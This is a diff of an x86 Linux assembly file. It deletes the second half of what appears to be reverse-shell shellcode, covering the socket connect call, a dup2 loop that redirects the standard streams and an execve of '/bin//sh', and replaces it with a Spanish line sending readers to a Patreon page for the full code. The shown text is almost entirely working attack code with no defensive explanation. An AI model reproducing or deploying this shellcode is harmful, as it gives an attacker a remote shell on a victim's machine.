@@ -36,40 +36,7 @@ push word 0x2
 
 mov ecx, esp
 
+Código completo.
+https://www.patreon.com/BGPavelAng
+Ayudame a seguir haciendo más de esto.
 
-push 0x10
-push ecx
-push edx
-
-mov ecx, esp
-
-inc ebx
-inc ebx
-
-int 0x80
-
-xchg edx, eax
-
-push 0x2
-pop ecx
-
-jnp:
-
-mov al, 0x3f
-int 0x80
-dec ecx
-jns jnp
-
-
-mov al, 0x0b
-xor ecx, ecx
-
-mov edx, ecx
-
-push ecx
-push 0x68732f2f
-push 0x6e69622f
-
-mov ebx, esp
-
-int 0x80
